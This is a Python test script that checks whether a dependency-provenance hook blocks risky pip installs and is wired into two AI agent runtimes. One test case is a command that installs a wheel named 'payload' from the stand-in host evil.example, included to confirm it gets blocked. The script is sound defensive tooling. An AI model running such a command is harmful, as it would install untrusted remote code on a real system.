#!/usr/bin/env python3
"""Prove the package provenance hook responds and is wired in both runtimes."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent.parent
HOOK = ROOT / "hooks" / "dependency-provenance-guard.py"
RUNTIMES = (
    Path.home() / ".claude" / "settings.json",
    Path.home() / ".codex" / "hooks.json",
)


def run_hook(command: str) -> str:
    event = {"tool_name": "Bash", "tool_input": {"command": command}}
    result = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps(event),
        text=True,
        capture_output=True,
        encoding="utf-8",
    )
    if result.returncode != 0:
        raise AssertionError(f"hook exited {result.returncode}: {result.stderr}")
    return result.stdout


def wired(path: Path) -> bool:
    data = json.loads(path.read_text(encoding="utf-8"))
    for entry in data.get("hooks", {}).get("PreToolUse", []):
        if entry.get("matcher") != "Bash":
            continue
        if any("dependency-provenance-guard.py" in h.get("command", "")
               for h in entry.get("hooks", [])):
            return True
    return False


def main() -> int:
    checks: list[str] = []
    self_test = subprocess.run(
        [sys.executable, str(HOOK), "--self-test"],
        text=True,
        capture_output=True,
        encoding="utf-8",
    )
    if self_test.returncode != 0 or "SELF-TEST: PASS" not in self_test.stdout:
        raise AssertionError(self_test.stdout + self_test.stderr)
    checks.append("self-test")

    blocked = run_hook("pip install https://evil.example/payload.whl --require-hashes")
    if '"decision": "block"' not in blocked:
        raise AssertionError("direct wheel was not blocked")
    checks.append("direct-wheel-block")

    blocked = run_hook("pip install demo==1.2.3")
    if '"decision": "block"' not in blocked:
        raise AssertionError("hashless pip install was not blocked")
    checks.append("hashless-pip-block")

    if run_hook("echo pip install demo"):
        raise AssertionError("non-install command produced a verdict")
    checks.append("non-install-pass")

    for runtime in RUNTIMES:
        if not runtime.exists() or not wired(runtime):
            raise AssertionError(f"Bash wiring missing: {runtime}")
        checks.append(runtime.parent.name)

    print("DEPENDENCY PROVENANCE WIRING: PASS (" + ", ".join(checks) + ")")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
